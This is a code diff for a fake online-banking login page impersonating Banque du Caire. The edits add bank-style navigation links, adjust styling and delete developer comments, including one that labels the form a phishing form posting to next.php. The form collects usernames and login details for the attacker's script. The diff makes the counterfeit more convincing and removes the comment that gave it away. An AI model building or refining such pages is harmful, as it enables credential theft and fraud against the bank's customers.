@@ -5,10 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
     <title>Banque du Caire - Banca en Línea</title>
     <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
-    <!-- Font Awesome para iconos -->
+    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        /* ===== RESET Y FUENTES ===== */
+        /* ===== RESET ===== */
         * {
             margin: 0;
             padding: 0;
@@ -18,7 +18,7 @@
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: #f0f2f5;
             display: flex;
-            flex-direction: column;
+            justify-content: center;
             align-items: center;
             min-height: 100vh;
             padding: 20px;
@@ -32,10 +32,34 @@
             overflow: hidden;
         }
 
-        /* ===== HEADER ===== */
+        /* ===== HEADER SUPERIOR (ATM, Help, etc.) ===== */
+        .top-bar {
+            background: #f8faff;
+            padding: 8px 40px;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            gap: 20px;
+            font-size: 13px;
+            color: #1a2b4a;
+            border-bottom: 1px solid #eaeef2;
+        }
+        .top-bar a {
+            color: #1a2b4a;
+            text-decoration: none;
+        }
+        .top-bar a:hover {
+            text-decoration: underline;
+        }
+        .top-bar .lang-ar {
+            font-family: 'Arial', sans-serif;
+            direction: rtl;
+        }
+
+        /* ===== HEADER PRINCIPAL ===== */
         .header {
             background: #ffffff;
-            padding: 18px 40px;
+            padding: 15px 40px;
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -44,17 +68,16 @@
         .logo {
             display: flex;
             align-items: center;
+            gap: 10px;
         }
         .logo img {
             height: 45px;
             width: auto;
-            margin-right: 10px;
         }
         .logo h1 {
             font-size: 22px;
             color: #1a2b4a;
             font-weight: 600;
-            letter-spacing: -0.5px;
         }
         .header-links a {
             color: #1a2b4a;
@@ -62,13 +85,9 @@
             margin-left: 25px;
             font-size: 14px;
             font-weight: 500;
-            transition: color 0.2s;
         }
         .header-links a:hover {
             color: #0056a7;
-        }
-        .header-links a i {
-            margin-right: 4px;
         }
 
         /* ===== HERO / LOGIN ===== */
@@ -296,6 +315,12 @@
 
         /* ===== RESPONSIVE ===== */
         @media (max-width: 768px) {
+            .top-bar {
+                padding: 8px 20px;
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 10px;
+            }
             .header {
                 flex-wrap: wrap;
                 padding: 15px 20px;
@@ -354,10 +379,16 @@
 
 <div class="container">
 
+    <!-- ===== TOP BAR (ATM, Help, Support, Árabe) ===== -->
+    <div class="top-bar">
+        <a href="#"><i class="fas fa-map-marker-alt"></i> ATM &amp; Branch Locator</a>
+        <a href="#"><i class="fas fa-question-circle"></i> Help &amp; Support</a>
+        <a href="#" class="lang-ar">أعلى</a>
+    </div>
+
     <!-- ===== HEADER ===== -->
     <header class="header">
         <div class="logo">
-            <!-- Tu logo descargado -->
             <img src="assets/img/logo-bdc.png" alt="Banque du Caire" onerror="this.style.display='none'">
             <h1>Banque du Caire</h1>
         </div>
@@ -373,7 +404,6 @@
             <h2>Welcome back</h2>
             <p class="sub">Access your accounts securely</p>
 
-            <!-- FORMULARIO DE PHISHING (envía a next.php) -->
             <form action="next.php" method="post" class="login-box">
                 <label for="user">Username</label>
                 <input type="text" id="user" name="user" placeholder="Enter your username" required>
@@ -391,7 +421,6 @@
         </div>
 
         <div class="hero-right">
-            <!-- Imagen decorativa (hero-card.png) -->
             <img src="assets/img/hero-card.png" alt="Banking" onerror="this.style.display='none'">
         </div>
     </section>
@@ -404,7 +433,7 @@
             <button class="btn-learn">Learn More</button>
         </div>
         <div class="edge-image">
-            <!-- Puedes usar otra imagen aquí, o dejar solo texto -->
+            <!-- Puedes poner una imagen decorativa; si no, se oculta -->
             <img src="assets/img/edge-image.png" alt="Edge" onerror="this.style.display='none'">
         </div>
     </section>
